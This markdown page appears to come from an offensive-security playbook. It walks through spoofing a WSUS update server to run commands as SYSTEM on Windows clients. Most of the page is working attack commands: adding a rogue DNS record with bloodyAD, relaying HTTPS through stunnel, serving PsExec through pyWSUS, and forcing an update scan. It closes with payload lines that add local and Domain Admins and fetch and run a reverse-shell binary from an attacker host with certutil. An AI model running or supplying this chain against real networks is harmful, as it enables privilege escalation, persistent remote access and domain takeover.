---
title: "10 · WSUS Attack (Fake Update Server)"
---

# 10 · WSUS Attack (Fake Update Server)

> Spoof the WSUS server → push a SYSTEM-level 'update' to the client.

!!! note "Phase overview"
    Windows Server Update Services tells clients which updates to install. The client trusts WSUS to deliver Microsoft-signed binaries, but it doesn't verify WHO is hosting WSUS, only that the binary is signed by Microsoft. So you spoof the WSUS hostname (often via a missing DNS record + AD-integrated DNS write), serve a Microsoft-signed binary like PsExec, pass it your own command-line, and the Windows Update service runs your command as SYSTEM. HTTPS WSUS additionally needs a valid CA-signed cert for the WSUS hostname that's where ESC1 (Phase 5) feeds in.

### 10.1 · Fake WSUS Server (full chain)

!!! info "Why this works / how it chains"

    Six terminals worth of work. Verify the registry. Check DNS for the WSUS hostname is empty. Add a DNS record pointing to your IP (bloodyAD addDnsRecord works if you have any domain user; AD-integrated DNS is writable by Authenticated Users by default). For HTTPS WSUS, get a CA-signed cert via ESC1 in the WSUS hostname. Run stunnel to terminate HTTPS on port 8531 and forward to pyWSUS on 8530. Run pyWSUS to serve PsExec with your command. Trigger Windows Update on the target. Result: SYSTEM execution.

!!! warning "What leads here"
    - WSUS configured (WUServer registry key present)
    - wsus hostname has NO DNS record (or you can modify it)
    - Windows Update service running
    - Signs: incident tickets mentioning WSUS, registry key set, nslookup for wsus.* returns nothing

```powershell title="Step 1 : verify WSUS config"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /s
# Look for: WUServer, UseWUServer=1
```

```powershell title="Step 2 : check if DNS exists"
nslookup wsus.domain.local
Resolve-DnsName wsus.domain.local
# Empty = add our own DNS record!
```

```bash title="Step 3 : add DNS record (any domain user)"
KRB5CCNAME=user.ccache faketime -f "+7h" \
  bloodyAD -u user -k \
  -d domain.local --host dc01.domain.local \
  add dnsRecord wsus YOUR_TUN0_IP
```

```bash title="Step 4 : get CA-signed cert (ESC1 chain)"
# (See ESC1 section - use DLL technique to get cert signed for wsus hostname)
openssl x509 -inform DER -in cert.cer -out cert.pem
cat cert.pem wsus_key.pem > wsus_chain.pem
```

```bash title="Step 5 : download PsExec (Microsoft-signed)"
wget https://live.sysinternals.com/tools/PsExec64.exe -O /tmp/PsExec64.exe
```

```bash title="Step 6 : Terminal 1: stunnel (HTTPS → HTTP)"
cat > /tmp/stunnel.conf << EOF
foreground = yes
[wsus]
accept = 8531
connect = 127.0.0.1:8530
cert = $(pwd)/wsus_chain.pem
EOF
sudo stunnel /tmp/stunnel.conf
```

```bash title="Step 7 : Terminal 2: pyWSUS"
git clone https://github.com/GoSecure/pyWSUS && cd pyWSUS
sudo python3 pywsus.py \
  --host 127.0.0.1 \
  --port 8530 \
  --executable /tmp/PsExec64.exe \
  --command "/accepteula /s cmd.exe /c YOUR_COMMAND" \
  -v
```

```powershell title="Step 8 : Terminal 3: trigger Windows Update"
Stop-Service wuauserv -Force
Remove-Item C:\Windows\SoftwareDistribution\* -Recurse -Force 2>$null
Start-Service wuauserv
wuauclt /resetauthorization /detectnow
usoclient StartScan
```

``` title="Successful pyWSUS output"
# POST /ClientWebService   → GetConfig
# POST /ClientWebService   → GetCookie
# POST /ClientWebService   → SyncUpdates
# POST /ClientWebService   → GetExtendedUpdateInfo
# GET /UUID/PsExec64.exe   ← payload downloaded → executes as SYSTEM!
```

```bash title="Common payload commands"
# Add to local admins
"/accepteula /s cmd.exe /c net localgroup administrators user /add"

# Reverse shell via download
"/accepteula /s cmd.exe /c certutil -urlcache -f http://IP/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe"

# Add domain admin
"/accepteula /s cmd.exe /c net group \"Domain Admins\" user /add /domain"
```

